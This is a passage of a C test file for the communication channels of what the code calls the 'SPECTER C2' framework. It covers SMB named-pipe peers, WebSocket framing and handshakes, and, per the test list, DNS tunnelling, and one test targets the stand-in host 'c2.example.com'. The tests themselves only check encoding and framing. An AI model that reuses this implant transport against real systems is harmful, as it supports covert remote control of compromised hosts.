             (int)ctx->state, COMMS_STATE_DISCONNECTED);
    check_eq("SMB reset peer count 0", (int)ctx->peer_count, 0);

    /* Verify server handles reset */
    for (int i = 0; i < SMB_MAX_INSTANCES; i++) {
        tests_run++;
        if (ctx->server_handles[i] == INVALID_HANDLE_VALUE) {
            tests_passed++;
        } else {
            printf("[FAIL] SMB server handle %d not reset\n", i);
        }
    }
    printf("[PASS] All server handles reset to INVALID_HANDLE_VALUE\n");
}

/* ------------------------------------------------------------------ */
/*  Test: SMB peer management                                          */
/* ------------------------------------------------------------------ */

static void test_smb_peer_init(void) {
    printf("\n=== SMB Peer Initialization ===\n");

    SMB_CONTEXT *ctx = smb_get_context();
    smb_test_reset_context(ctx);

    /* Verify all peers start inactive */
    for (int i = 0; i < SMB_MAX_INSTANCES; i++) {
        tests_run++;
        if (!ctx->peers[i].active &&
            ctx->peers[i].pipe_handle == INVALID_HANDLE_VALUE) {
            tests_passed++;
        } else {
            printf("[FAIL] SMB peer %d not properly initialized\n", i);
        }
    }
    printf("[PASS] All peers initialized correctly\n");
}

static void test_smb_peer_disconnect(void) {
    printf("\n=== SMB Peer Disconnect ===\n");

    SMB_CONTEXT *ctx = smb_get_context();
    smb_test_reset_context(ctx);

    /* Simulate an active peer */
    ctx->peers[0].active = TRUE;
    ctx->peers[0].peer_id = 0;
    ctx->peers[0].msg_seq = 42;
    for (int i = 0; i < 32; i++)
        ctx->peers[0].session_key[i] = (BYTE)i;
    ctx->peer_count = 1;

    /* Disconnect the peer */
    NTSTATUS status = smb_disconnect_peer(NULL, 0);
    check_eq("SMB disconnect peer status", (int)status, (int)STATUS_SUCCESS);
    check_eq("SMB peer no longer active", (int)ctx->peers[0].active, FALSE);
    check_eq("SMB peer count decremented", (int)ctx->peer_count, 0);

    /* Verify session key zeroed */
    int key_zero = 1;
    for (int i = 0; i < 32; i++) {
        if (ctx->peers[0].session_key[i] != 0) { key_zero = 0; break; }
    }
    tests_run++;
    if (key_zero) {
        tests_passed++;
        printf("[PASS] SMB peer session key zeroed\n");
    } else {
        printf("[FAIL] SMB peer session key not zeroed\n");
    }

    /* Disconnect out of range index */
    status = smb_disconnect_peer(NULL, SMB_MAX_INSTANCES);
    check_eq("SMB disconnect invalid index", (int)status, (int)STATUS_INVALID_PARAMETER);

    /* Disconnect already-inactive peer */
    status = smb_disconnect_peer(NULL, 1);
    check_eq("SMB disconnect inactive peer", (int)status, (int)STATUS_SUCCESS);
}

/* ------------------------------------------------------------------ */
/*  Test: SMB wire format structure                                    */
/* ------------------------------------------------------------------ */

static void test_smb_wire_format(void) {
    printf("\n=== SMB Wire Format Structure ===\n");

    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    for (int i = 0; i < 32; i++) ctx.session_key[i] = (BYTE)(0xAB ^ i);
    ctx.msg_seq = 5; /* Non-zero sequence */

    BYTE plaintext[] = "test";
    BYTE wire[128];

    DWORD wire_len = smb_build_message(&ctx, plaintext, 4, wire, sizeof(wire));

    /* Verify structure: [4 len][12 nonce][4 ciphertext][16 tag] = 36 */
    check_eq("SMB wire total length", (int)wire_len, 36);

    /* Verify nonce encodes sequence number 5 in LE */
    check_eq("SMB nonce seq byte0", wire[4], 5);
    check_eq("SMB nonce seq byte1", wire[5], 0);
    check_eq("SMB nonce seq byte2", wire[6], 0);
    check_eq("SMB nonce seq byte3", wire[7], 0);

    /* Remaining nonce bytes should be zero */
    int nonce_tail_zero = 1;
    for (int i = 8; i < 16; i++) {
        if (wire[i] != 0) { nonce_tail_zero = 0; break; }
    }
    tests_run++;
    if (nonce_tail_zero) {
        tests_passed++;
        printf("[PASS] SMB nonce tail bytes are zero\n");
    } else {
        printf("[FAIL] SMB nonce tail bytes not zero\n");
    }
}

/* ================================================================== */
/*  WebSocket Channel Tests                                            */
/* ================================================================== */

/* ------------------------------------------------------------------ */
/*  Test: SHA-1 (RFC 3174 test vectors)                                */
/* ------------------------------------------------------------------ */

static void test_ws_sha1_basic(void) {
    printf("\n=== WebSocket SHA-1 — Basic ===\n");

    /* Test vector 1: "abc" */
    WS_SHA1_CTX sha1;
    BYTE digest[WS_SHA1_DIGEST_SIZE];

    ws_sha1_init(&sha1);
    ws_sha1_update(&sha1, (const BYTE *)"abc", 3);
    ws_sha1_final(&sha1, digest);

    BYTE expected1[] = {
        0xA9, 0x99, 0x3E, 0x36, 0x47, 0x06, 0x81, 0x6A,
        0xBA, 0x3E, 0x25, 0x71, 0x78, 0x50, 0xC2, 0x6C,
        0x9C, 0xD0, 0xD8, 0x9D
    };
    check_bytes_eq("SHA-1 'abc'", digest, expected1, 20);

    /* Test vector 2: empty string */
    ws_sha1_init(&sha1);
    ws_sha1_update(&sha1, (const BYTE *)"", 0);
    ws_sha1_final(&sha1, digest);

    BYTE expected2[] = {
        0xDA, 0x39, 0xA3, 0xEE, 0x5E, 0x6B, 0x4B, 0x0D,
        0x32, 0x55, 0xBF, 0xEF, 0x95, 0x60, 0x18, 0x90,
        0xAF, 0xD8, 0x07, 0x09
    };
    check_bytes_eq("SHA-1 empty", digest, expected2, 20);

    /* Test vector 3: "abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq" */
    ws_sha1_init(&sha1);
    const char *tv3 = "abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq";
    ws_sha1_update(&sha1, (const BYTE *)tv3, 56);
    ws_sha1_final(&sha1, digest);

    BYTE expected3[] = {
        0x84, 0x98, 0x3E, 0x44, 0x1C, 0x3B, 0xD2, 0x6E,
        0xBA, 0xAE, 0x4A, 0xA1, 0xF9, 0x51, 0x29, 0xE5,
        0xE5, 0x46, 0x70, 0xF1
    };
    check_bytes_eq("SHA-1 448-bit", digest, expected3, 20);
}

/* ------------------------------------------------------------------ */
/*  Test: Base64 encoding                                              */
/* ------------------------------------------------------------------ */

static void test_ws_base64_encode(void) {
    printf("\n=== WebSocket Base64 — Encode ===\n");

    char out[128];

    /* RFC 4648 test vectors */
    DWORD len = ws_base64_encode((const BYTE *)"", 0, out, sizeof(out));
    check_eq("Base64 encode empty", (int)len, 0);

    len = ws_base64_encode((const BYTE *)"f", 1, out, sizeof(out));
    check_str_eq("Base64 encode 'f'", out, "Zg==");
    check_eq("Base64 encode 'f' length", (int)len, 4);

    len = ws_base64_encode((const BYTE *)"fo", 2, out, sizeof(out));
    check_str_eq("Base64 encode 'fo'", out, "Zm8=");

    len = ws_base64_encode((const BYTE *)"foo", 3, out, sizeof(out));
    check_str_eq("Base64 encode 'foo'", out, "Zm9v");

    len = ws_base64_encode((const BYTE *)"foob", 4, out, sizeof(out));
    check_str_eq("Base64 encode 'foob'", out, "Zm9vYg==");

    len = ws_base64_encode((const BYTE *)"fooba", 5, out, sizeof(out));
    check_str_eq("Base64 encode 'fooba'", out, "Zm9vYmE=");

    len = ws_base64_encode((const BYTE *)"foobar", 6, out, sizeof(out));
    check_str_eq("Base64 encode 'foobar'", out, "Zm9vYmFy");

    /* Null input */
    len = ws_base64_encode(NULL, 5, out, sizeof(out));
    check_eq("Base64 encode null input", (int)len, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: Base64 decoding                                              */
/* ------------------------------------------------------------------ */

static void test_ws_base64_decode(void) {
    printf("\n=== WebSocket Base64 — Decode ===\n");

    BYTE out[128];

    DWORD len = ws_base64_decode("Zg==", 4, out, sizeof(out));
    check_eq("Base64 decode 'Zg==' length", (int)len, 1);
    check_eq("Base64 decode 'Zg==' value", out[0], 'f');

    len = ws_base64_decode("Zm9v", 4, out, sizeof(out));
    check_eq("Base64 decode 'Zm9v' length", (int)len, 3);
    check_eq("Base64 decode 'Zm9v' byte0", out[0], 'f');
    check_eq("Base64 decode 'Zm9v' byte1", out[1], 'o');
    check_eq("Base64 decode 'Zm9v' byte2", out[2], 'o');

    len = ws_base64_decode("Zm9vYmFy", 8, out, sizeof(out));
    check_eq("Base64 decode 'Zm9vYmFy' length", (int)len, 6);
    out[6] = '\0';
    check_str_eq("Base64 decode 'foobar'", (char *)out, "foobar");

    /* Null input */
    len = ws_base64_decode(NULL, 4, out, sizeof(out));
    check_eq("Base64 decode null input", (int)len, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: Base64 roundtrip                                             */
/* ------------------------------------------------------------------ */

static void test_ws_base64_roundtrip(void) {
    printf("\n=== WebSocket Base64 — Roundtrip ===\n");

    BYTE original[32];
    for (int i = 0; i < 32; i++) original[i] = (BYTE)(i * 7 + 0x41);

    char encoded[128];
    BYTE decoded[128];

    for (int test_len = 1; test_len <= 32; test_len++) {
        DWORD enc_len = ws_base64_encode(original, test_len, encoded, sizeof(encoded));
        tests_run++;
        if (enc_len > 0) {
            DWORD dec_len = ws_base64_decode(encoded, enc_len, decoded, sizeof(decoded));
            if ((int)dec_len == test_len && memcmp(original, decoded, test_len) == 0) {
                tests_passed++;
                printf("[PASS] Base64 roundtrip %d bytes\n", test_len);
            } else {
                printf("[FAIL] Base64 roundtrip %d bytes (dec_len=%d)\n",
                       test_len, (int)dec_len);
            }
        } else {
            printf("[FAIL] Base64 roundtrip %d bytes (encode failed)\n", test_len);
        }
    }
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket key generation and accept computation              */
/* ------------------------------------------------------------------ */

static void test_ws_key_generation(void) {
    printf("\n=== WebSocket Key Generation ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0x12345678);

    ws_generate_key(ws);

    /* Key should be 24 base64 chars */
    int key_len = 0;
    while (ws->ws_key_b64[key_len]) key_len++;
    check_eq("WS key length", key_len, WS_KEY_B64_SIZE);

    /* Expected accept should be 28 base64 chars */
    int accept_len = 0;
    while (ws->expected_accept[accept_len]) accept_len++;
    check_eq("WS accept length", accept_len, WS_ACCEPT_B64_SIZE);

    /* Verify the accept computation manually:
     * SHA-1(key_b64 + GUID) → base64 */
    WS_SHA1_CTX sha1;
    ws_sha1_init(&sha1);
    ws_sha1_update(&sha1, (const BYTE *)ws->ws_key_b64, key_len);
    ws_sha1_update(&sha1, (const BYTE *)"258EAFA5-E914-47DA-95CA-5AB5DC4BBE18", 36);

    BYTE digest[20];
    ws_sha1_final(&sha1, digest);

    char verify_accept[64];
    ws_base64_encode(digest, 20, verify_accept, sizeof(verify_accept));

    check_str_eq("WS accept matches manual computation",
                 ws->expected_accept, verify_accept);

    /* Second generation should produce different key */
    char first_key[WS_KEY_B64_SIZE + 1];
    memcpy(first_key, ws->ws_key_b64, WS_KEY_B64_SIZE + 1);

    ws_generate_key(ws);

    tests_run++;
    if (strcmp(ws->ws_key_b64, first_key) != 0) {
        tests_passed++;
        printf("[PASS] WS second key differs\n");
    } else {
        printf("[FAIL] WS second key same as first\n");
    }
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame construction — binary                        */
/* ------------------------------------------------------------------ */

static void test_ws_build_frame_binary(void) {
    printf("\n=== WebSocket Frame Build — Binary ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0xAABBCCDD);

    BYTE payload[] = { 0x01, 0x02, 0x03, 0x04 };
    BYTE frame[64];

    DWORD frame_len = ws_build_frame(ws, WS_OPCODE_BINARY, TRUE,
                                      payload, 4, frame, sizeof(frame));

    /* Header: 2 bytes + 4 mask = 6, payload = 4, total = 10 */
    check_eq("WS binary frame length", (int)frame_len, 10);

    /* Byte 0: FIN=1, opcode=0x2 → 0x82 */
    check_eq("WS binary frame byte0", frame[0], 0x82);

    /* Byte 1: MASK=1, len=4 → 0x84 */
    check_eq("WS binary frame byte1", frame[1], 0x84);

    /* Bytes 2-5 are masking key */
    BYTE mask_key[4];
    memcpy(mask_key, frame + 2, 4);

    /* Bytes 6-9 are masked payload — unmask and verify */
    BYTE unmasked[4];
    memcpy(unmasked, frame + 6, 4);
    ws_apply_mask(unmasked, 4, mask_key);

    check_bytes_eq("WS binary frame payload", unmasked, payload, 4);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame construction — text                          */
/* ------------------------------------------------------------------ */

static void test_ws_build_frame_text(void) {
    printf("\n=== WebSocket Frame Build — Text ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0x11111111);

    const char *text = "hello";
    BYTE frame[64];

    DWORD frame_len = ws_build_frame(ws, WS_OPCODE_TEXT, TRUE,
                                      (const BYTE *)text, 5,
                                      frame, sizeof(frame));

    /* 2 + 4 mask + 5 payload = 11 */
    check_eq("WS text frame length", (int)frame_len, 11);
    check_eq("WS text frame byte0", frame[0], 0x81); /* FIN + TEXT */
    check_eq("WS text frame payload len", frame[1] & 0x7F, 5);
    check_eq("WS text frame mask bit", (frame[1] & 0x80) ? 1 : 0, 1);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame construction — ping                          */
/* ------------------------------------------------------------------ */

static void test_ws_build_frame_ping(void) {
    printf("\n=== WebSocket Frame Build — Ping ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0x22222222);

    BYTE frame[64];
    DWORD frame_len = ws_build_frame(ws, WS_OPCODE_PING, TRUE,
                                      NULL, 0, frame, sizeof(frame));

    /* 2 header + 4 mask + 0 payload = 6 */
    check_eq("WS ping frame length", (int)frame_len, 6);
    check_eq("WS ping frame opcode", frame[0], 0x89); /* FIN + PING */
    check_eq("WS ping frame payload len", frame[1] & 0x7F, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame construction — close                         */
/* ------------------------------------------------------------------ */

static void test_ws_build_frame_close(void) {
    printf("\n=== WebSocket Frame Build — Close ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0x33333333);

    /* Close with status code 1000 (normal) */
    BYTE close_payload[2] = { 0x03, 0xE8 }; /* 1000 BE */
    BYTE frame[64];

    DWORD frame_len = ws_build_frame(ws, WS_OPCODE_CLOSE, TRUE,
                                      close_payload, 2, frame, sizeof(frame));

    /* 2 + 4 mask + 2 payload = 8 */
    check_eq("WS close frame length", (int)frame_len, 8);
    check_eq("WS close frame opcode", frame[0], 0x88); /* FIN + CLOSE */
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame construction — extended payload (16-bit)     */
/* ------------------------------------------------------------------ */

static void test_ws_build_frame_extended_16(void) {
    printf("\n=== WebSocket Frame Build — Extended 16-bit Length ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0x44444444);

    /* 200 bytes payload (> 125, uses 16-bit extended length) */
    BYTE payload[200];
    for (int i = 0; i < 200; i++) payload[i] = (BYTE)(i & 0xFF);

    BYTE frame[512];
    DWORD frame_len = ws_build_frame(ws, WS_OPCODE_BINARY, TRUE,
                                      payload, 200, frame, sizeof(frame));

    /* 2 base + 2 extended len + 4 mask + 200 payload = 208 */
    check_eq("WS 16-bit ext frame length", (int)frame_len, 208);
    check_eq("WS 16-bit ext len marker", frame[1] & 0x7F, 126);

    /* Check extended length bytes (big-endian) */
    check_eq("WS 16-bit ext len high", frame[2], 0);
    check_eq("WS 16-bit ext len low", frame[3], 200);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame parsing                                      */
/* ------------------------------------------------------------------ */

static void test_ws_parse_frame_basic(void) {
    printf("\n=== WebSocket Frame Parse — Basic ===\n");

    /* Build a server frame (unmasked) manually:
     * FIN=1, opcode=text, no mask, payload="hi" */
    BYTE wire[] = { 0x81, 0x02, 'h', 'i' };

    WS_FRAME frame;
    DWORD consumed = ws_parse_frame(wire, sizeof(wire), &frame);

    check_eq("WS parse basic consumed", (int)consumed, 4);
    check_eq("WS parse basic fin", (int)frame.fin, TRUE);
    check_eq("WS parse basic opcode", frame.opcode, WS_OPCODE_TEXT);
    check_eq("WS parse basic masked", (int)frame.masked, FALSE);
    check_eq("WS parse basic payload_len", (int)frame.payload_len, 2);
    check_eq("WS parse basic payload[0]", frame.payload[0], 'h');
    check_eq("WS parse basic payload[1]", frame.payload[1], 'i');
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame parsing — 16-bit extended length             */
/* ------------------------------------------------------------------ */

static void test_ws_parse_frame_extended_16(void) {
    printf("\n=== WebSocket Frame Parse — Extended 16-bit ===\n");

    /* Server frame: FIN=1, binary, 200 bytes payload */
    BYTE wire[208];
    wire[0] = 0x82;   /* FIN + BINARY */
    wire[1] = 126;    /* 16-bit extended length, no mask */
    wire[2] = 0;      /* Length high byte */
    wire[3] = 200;    /* Length low byte */
    for (int i = 0; i < 200; i++) wire[4 + i] = (BYTE)i;

    WS_FRAME frame;
    DWORD consumed = ws_parse_frame(wire, 204, &frame);

    check_eq("WS parse 16-bit consumed", (int)consumed, 204);
    check_eq("WS parse 16-bit payload_len", (int)frame.payload_len, 200);
    check_eq("WS parse 16-bit opcode", frame.opcode, WS_OPCODE_BINARY);
    check_eq("WS parse 16-bit fin", (int)frame.fin, TRUE);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame parsing — masked frame                       */
/* ------------------------------------------------------------------ */

static void test_ws_parse_frame_masked(void) {
    printf("\n=== WebSocket Frame Parse — Masked ===\n");

    /* Client-like frame: FIN=1, text, masked, "test" */
    BYTE mask_key[4] = { 0xAA, 0xBB, 0xCC, 0xDD };
    BYTE wire[12];
    wire[0] = 0x81;               /* FIN + TEXT */
    wire[1] = 0x80 | 4;           /* MASK + len=4 */
    memcpy(wire + 2, mask_key, 4); /* Masking key */
    wire[6] = 't' ^ 0xAA;
    wire[7] = 'e' ^ 0xBB;
    wire[8] = 's' ^ 0xCC;
    wire[9] = 't' ^ 0xDD;

    WS_FRAME frame;
    DWORD consumed = ws_parse_frame(wire, 10, &frame);

    check_eq("WS parse masked consumed", (int)consumed, 10);
    check_eq("WS parse masked masked flag", (int)frame.masked, TRUE);
    check_eq("WS parse masked payload_len", (int)frame.payload_len, 4);
    check_bytes_eq("WS parse masked mask_key", frame.mask_key, mask_key, 4);

    /* Unmask and verify */
    BYTE unmasked[4];
    memcpy(unmasked, frame.payload, 4);
    ws_apply_mask(unmasked, 4, frame.mask_key);
    check_eq("WS parse masked payload[0]", unmasked[0], 't');
    check_eq("WS parse masked payload[1]", unmasked[1], 'e');
    check_eq("WS parse masked payload[2]", unmasked[2], 's');
    check_eq("WS parse masked payload[3]", unmasked[3], 't');
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame parse — incomplete data                      */
/* ------------------------------------------------------------------ */

static void test_ws_parse_frame_incomplete(void) {
    printf("\n=== WebSocket Frame Parse — Incomplete ===\n");

    /* Too short: just 1 byte */
    BYTE wire1[] = { 0x81 };
    WS_FRAME frame;
    DWORD consumed = ws_parse_frame(wire1, 1, &frame);
    check_eq("WS parse 1 byte returns 0", (int)consumed, 0);

    /* Header says 5 bytes payload but only 3 available */
    BYTE wire2[] = { 0x82, 0x05, 0x01, 0x02, 0x03 };
    consumed = ws_parse_frame(wire2, 5, &frame);
    check_eq("WS parse truncated payload returns 0", (int)consumed, 0);

    /* Null inputs */
    consumed = ws_parse_frame(NULL, 10, &frame);
    check_eq("WS parse null data returns 0", (int)consumed, 0);

    consumed = ws_parse_frame(wire2, 5, NULL);
    check_eq("WS parse null frame returns 0", (int)consumed, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket masking/unmasking                                  */
/* ------------------------------------------------------------------ */

static void test_ws_apply_mask(void) {
    printf("\n=== WebSocket Masking ===\n");

    BYTE data[] = { 'H', 'e', 'l', 'l', 'o', '!', '!', '!' };
    BYTE original[8];
    memcpy(original, data, 8);

    BYTE mask[4] = { 0x37, 0x0A, 0x52, 0x1F };

    /* Mask */
    ws_apply_mask(data, 8, mask);

    /* Data should be different from original */
    tests_run++;
    if (memcmp(data, original, 8) != 0) {
        tests_passed++;
        printf("[PASS] WS mask changes data\n");
    } else {
        printf("[FAIL] WS mask did not change data\n");
    }

    /* Unmask (same operation) should restore original */
    ws_apply_mask(data, 8, mask);
    check_bytes_eq("WS unmask restores original", data, original, 8);

    /* Empty data should not crash */
    ws_apply_mask(data, 0, mask);
    check_bytes_eq("WS mask empty is noop", data, original, 8);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket upgrade request construction                       */
/* ------------------------------------------------------------------ */

static void test_ws_build_upgrade_request(void) {
    printf("\n=== WebSocket Upgrade Request ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0x55555555);
    ws_generate_key(ws);

    BYTE request[1024];
    DWORD req_len = ws_build_upgrade_request(ws, "c2.example.com", "/ws",
                                              request, sizeof(request));

    check_eq("WS upgrade request non-zero", (int)(req_len > 0), 1);

    /* NUL-terminate for string searching */
    request[req_len] = '\0';
    const char *req_str = (const char *)request;

    /* Check required components */
    tests_run++;
    if (strstr(req_str, "GET /ws HTTP/1.1") != NULL) {
        tests_passed++;
        printf("[PASS] WS upgrade has GET line\n");
    } else {
        printf("[FAIL] WS upgrade missing GET line\n");
    }

    tests_run++;
    if (strstr(req_str, "Host: c2.example.com") != NULL) {
        tests_passed++;
        printf("[PASS] WS upgrade has Host header\n");
    } else {
        printf("[FAIL] WS upgrade missing Host header\n");
    }

    tests_run++;
    if (strstr(req_str, "Upgrade: websocket") != NULL) {
        tests_passed++;
        printf("[PASS] WS upgrade has Upgrade header\n");
    } else {
        printf("[FAIL] WS upgrade missing Upgrade header\n");
    }

    tests_run++;
    if (strstr(req_str, "Connection: Upgrade") != NULL) {
        tests_passed++;
        printf("[PASS] WS upgrade has Connection header\n");
    } else {
        printf("[FAIL] WS upgrade missing Connection header\n");
    }

    tests_run++;
    if (strstr(req_str, "Sec-WebSocket-Key:") != NULL) {
        tests_passed++;
        printf("[PASS] WS upgrade has Key header\n");
    } else {
        printf("[FAIL] WS upgrade missing Key header\n");
    }

    tests_run++;
    if (strstr(req_str, "Sec-WebSocket-Version: 13") != NULL) {
        tests_passed++;
        printf("[PASS] WS upgrade has Version header\n");
    } else {
        printf("[FAIL] WS upgrade missing Version header\n");
    }

    /* Null inputs */
    DWORD null_len = ws_build_upgrade_request(NULL, "host", "/",
                                               request, sizeof(request));
    check_eq("WS upgrade null ctx", (int)null_len, 0);

    null_len = ws_build_upgrade_request(ws, NULL, "/", request, sizeof(request));
    check_eq("WS upgrade null host", (int)null_len, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket upgrade response validation                        */
/* ------------------------------------------------------------------ */

static void test_ws_validate_upgrade_response(void) {
    printf("\n=== WebSocket Upgrade Response Validation ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0x66666666);
    ws_generate_key(ws);

    /* Build a valid 101 response */
    char response[512];
    int rlen = snprintf(response, sizeof(response),
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Accept: %s\r\n"
        "\r\n",
        ws->expected_accept);

    BOOL valid = ws_validate_upgrade_response(ws, (const BYTE *)response, rlen);
    check_eq("WS valid upgrade response", (int)valid, TRUE);

    /* Wrong accept value */
    char bad_response[512];
    snprintf(bad_response, sizeof(bad_response),
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Accept: AAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
        "\r\n");

    valid = ws_validate_upgrade_response(ws, (const BYTE *)bad_response,
                                          (DWORD)strlen(bad_response));
    check_eq("WS invalid accept rejected", (int)valid, FALSE);

    /* 200 instead of 101 */
    char bad_status[256] = "HTTP/1.1 200 OK\r\n\r\n";
    valid = ws_validate_upgrade_response(ws, (const BYTE *)bad_status,
                                          (DWORD)strlen(bad_status));
    check_eq("WS 200 status rejected", (int)valid, FALSE);

    /* Null inputs */
    valid = ws_validate_upgrade_response(NULL, (const BYTE *)response, rlen);
    check_eq("WS validate null ctx", (int)valid, FALSE);

    valid = ws_validate_upgrade_response(ws, NULL, 0);
    check_eq("WS validate null response", (int)valid, FALSE);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame build/parse roundtrip                        */
/* ------------------------------------------------------------------ */

static void test_ws_frame_roundtrip(void) {
    printf("\n=== WebSocket Frame Roundtrip ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0x77777777);

    BYTE payload[] = "SPECTER C2 test payload data here";
    DWORD payload_len = 33;

    BYTE frame_buf[128];
    DWORD frame_len = ws_build_frame(ws, WS_OPCODE_BINARY, TRUE,
                                      payload, payload_len,
                                      frame_buf, sizeof(frame_buf));

    check_eq("WS roundtrip frame built", (int)(frame_len > 0), 1);

    /* Parse the frame back */
    WS_FRAME parsed;
    DWORD consumed = ws_parse_frame(frame_buf, frame_len, &parsed);

    check_eq("WS roundtrip parse consumed", (int)consumed, (int)frame_len);
    check_eq("WS roundtrip opcode", parsed.opcode, WS_OPCODE_BINARY);
    check_eq("WS roundtrip fin", (int)parsed.fin, TRUE);
    check_eq("WS roundtrip masked", (int)parsed.masked, TRUE);
    check_eq("WS roundtrip payload_len", (int)parsed.payload_len, (int)payload_len);

    /* Unmask and verify payload */
    BYTE decoded[64];
    memcpy(decoded, parsed.payload, parsed.payload_len);
    ws_apply_mask(decoded, parsed.payload_len, parsed.mask_key);
    check_bytes_eq("WS roundtrip payload matches", decoded, payload, payload_len);
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket context state transitions                          */
/* ------------------------------------------------------------------ */

static void test_ws_state_transitions(void) {
    printf("\n=== WebSocket State Transitions ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);

    check_eq("WS initial ws_state", (int)ws->ws_state, WS_STATE_DISCONNECTED);
    check_eq("WS initial comms_state", (int)ws->state, COMMS_STATE_DISCONNECTED);

    /* Simulate connect */
    ws->ws_state = WS_STATE_UPGRADED;
    ws->state = COMMS_STATE_REGISTERED;
    check_eq("WS after connect ws_state", (int)ws->ws_state, WS_STATE_UPGRADED);
    check_eq("WS after connect comms_state", (int)ws->state, COMMS_STATE_REGISTERED);

    /* Simulate disconnect */
    NTSTATUS status = ws_disconnect(NULL);
    check_eq("WS disconnect status", (int)status, (int)STATUS_SUCCESS);
    check_eq("WS post-disconnect ws_state", (int)ws->ws_state, WS_STATE_DISCONNECTED);
    check_eq("WS post-disconnect comms_state", (int)ws->state, COMMS_STATE_DISCONNECTED);

    /* Session key should be zeroed */
    int key_zero = 1;
    for (int i = 0; i < 32; i++) {
        if (ws->session_key[i] != 0) { key_zero = 0; break; }
    }
    tests_run++;
    if (key_zero) {
        tests_passed++;
        printf("[PASS] WS session key zeroed after disconnect\n");
    } else {
        printf("[FAIL] WS session key not zeroed after disconnect\n");
    }
}

/* ------------------------------------------------------------------ */
/*  Test: WebSocket frame build overflow                               */
/* ------------------------------------------------------------------ */

static void test_ws_build_frame_overflow(void) {
    printf("\n=== WebSocket Frame Build — Overflow ===\n");

    WS_CONTEXT *ws = ws_get_context();
    ws_test_reset_context(ws);
    ws_test_set_prng_seed(ws, 0x88888888);

    BYTE payload[16] = {0};
    BYTE tiny_buf[4];

    /* Buffer too small for frame */
    DWORD len = ws_build_frame(ws, WS_OPCODE_BINARY, TRUE,
                                payload, 16, tiny_buf, sizeof(tiny_buf));
    check_eq("WS frame overflow returns 0", (int)len, 0);

    /* Null output buffer */
    len = ws_build_frame(ws, WS_OPCODE_BINARY, TRUE,
                          payload, 16, NULL, 0);
    check_eq("WS frame null output returns 0", (int)len, 0);
}

/* ------------------------------------------------------------------ */
/*  Main                                                               */
/* ------------------------------------------------------------------ */

int main(void) {
    printf("SPECTER Channel Test Suite\n");
    printf("===============================\n");

    /* Base32 tests */
    test_base32_encode_basic();
    test_base32_encode_binary();
    test_base32_encode_overflow();
    test_base32_decode_basic();
    test_base32_roundtrip();

    /* DNS wire format tests */
    test_dns_build_query();
    test_dns_build_query_txt();
    test_dns_build_query_null();
    test_dns_txid_randomization();

    /* Subdomain encoding tests */
    test_dns_subdomain_encoding();
    test_dns_subdomain_overflow();
    test_dns_label_constraints();

    /* Response parsing tests */
    test_dns_parse_txt_response();
    test_dns_parse_null_response();
    test_dns_parse_nxdomain();
    test_dns_parse_not_response();

    /* DNS Channel state tests */
    test_channel_state_transitions();

    /* SMB pipe name tests */
    test_smb_pipe_path_basic();
    test_smb_pipe_path_null();
    test_smb_pipe_path_custom();

    /* SMB message construction tests */
    test_smb_build_message_basic();
    test_smb_build_message_null();
    test_smb_build_message_overflow();

    /* SMB message roundtrip tests */
    test_smb_message_roundtrip();
    test_smb_message_tamper();
    test_smb_parse_message_null();
    test_smb_parse_message_short();

    /* SMB channel state tests */
    test_smb_state_transitions();
    test_smb_context_reset();

    /* SMB peer management tests */
    test_smb_peer_init();
    test_smb_peer_disconnect();

    /* SMB wire format tests */
    test_smb_wire_format();

    /* WebSocket SHA-1 tests */
    test_ws_sha1_basic();

    /* WebSocket Base64 tests */
    test_ws_base64_encode();
    test_ws_base64_decode();
    test_ws_base64_roundtrip();

    /* WebSocket key generation tests */
    test_ws_key_generation();

    /* WebSocket frame construction tests */
    test_ws_build_frame_binary();
    test_ws_build_frame_text();
    test_ws_build_frame_ping();
    test_ws_build_frame_close();
    test_ws_build_frame_extended_16();
    test_ws_build_frame_overflow();

    /* WebSocket frame parsing tests */
    test_ws_parse_frame_basic();
    test_ws_parse_frame_extended_16();
    test_ws_parse_frame_masked();
    test_ws_parse_frame_incomplete();

